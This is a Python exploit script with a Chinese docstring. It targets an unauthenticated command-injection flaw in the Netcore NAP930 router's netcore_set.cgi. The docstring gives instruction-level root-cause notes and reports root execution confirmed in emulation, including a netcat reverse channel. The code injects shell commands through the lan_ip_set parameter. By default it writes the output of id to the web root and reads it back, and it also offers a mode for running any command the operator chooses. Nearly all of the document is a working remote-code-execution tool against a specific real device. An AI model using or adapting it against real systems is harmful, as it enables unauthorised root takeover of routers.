#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Netcore NAP930 V0.1.241010.141410  netcore_set.cgi 未授权命令注入 (RCE) EXP
目标架构: aarch64 cortex-a53 / OpenWrt 21.02-SNAPSHOT (mediatek/mt7981)
漏洞位置: /www/cgi-bin/cgi-bin-igd/netcore_set.cgi (29KB aarch64 ELF CGI)
根因(指令级污点流):
  main(0x401050): fscanf(stdin)|getenv("QUERY_STRING") 取输入
    -> 0x401320 解析 key=value 链表 (0x4011d0/0x401270 切分, 0x4045d8 仅 %XX urldecode, 无任何字符过滤)
    -> 0x402c38: system("uci get auto_ac.auto_ac.para_by") 软门槛
       (返回空或 "old_ac" 放行 —— 出厂态未配置即为空 => 默认可达)
    -> 0x403b18: sprintf(buf, "echo %s >/tmp/location_time", value); system(buf)   [取值后零校验]
    -> 0x403c3c: snprintf(buf, 0x28, "echo %s >/tmp/1.txt", value);   system(buf)  [lan_ip_set, 零校验]
    -> (led_off_on_status / location_time_enable 同型, 带 atoi!=0 门槛)
  全程无 sid/session/鉴权。
类型: CWE-78 (OS Command Injection), 未授权 RCE
利用条件: 可达设备 Web 端口 (80/443/23355); auto_ac.auto_ac.para_by 未配置或为 old_ac

实测 (qemu-user 模拟环境):
  strace 铁证: sh -c "echo 1;id>/tmp/sv; >/tmp/1.txt"  => uid=0(root)
  Windows 主机 -> CGI 注入 -> nc 反向通道收到 /etc/banner 全文

用法:
  python netcore_set_rce.py <IP> [端口]              # id 落盘验证 + 读回
  python netcore_set_rce.py <IP> 80 cmd "任意命令"    # 命令中空格用真实 tab 或 ${IFS} 之外的自备分隔
注意: 参数值经 %XX urldecode; 命令分隔用 ";"(可 %3B); 空格必须用 %09(tab), ${IFS} 在该 system 路径会带换行破坏命令。
"""
import sys
import urllib.request
import urllib.parse

PATH = "/cgi-bin/cgi-bin-igd/netcore_set.cgi"


def inject(target, port, cmd):
    """cmd 直接拼进 echo %s >/tmp/1.txt, 无需引号逃逸"""
    payload = "lan_ip_set=1;" + cmd
    url = "http://%s:%d%s?%s" % (target, port, PATH,
                                 urllib.parse.quote(payload, safe=""))
    try:
        urllib.request.urlopen(url, timeout=15).read()
    except Exception:
        pass  # 注入先于 CGI 应答执行; Bad Gateway 不影响结果


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        return
    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    mode = sys.argv[3] if len(sys.argv) > 3 else "id"

    if mode == "cmd":
        cmd = sys.argv[4].replace(" ", "\t")   # 空格转 tab
        print("[*] 执行:", cmd)
        inject(target, port, cmd)
        print("[+] 已发送 (盲执行)")
    else:
        print("[*] 验证: id > /www/pwn2.txt 再读回")
        inject(target, port, "id\t>/www/pwn2.txt")
        out = urllib.request.urlopen(
            "http://%s:%d/pwn2.txt" % (target, port), timeout=10).read()
        print(out.decode("utf-8", "replace"))


if __name__ == "__main__":
    main()
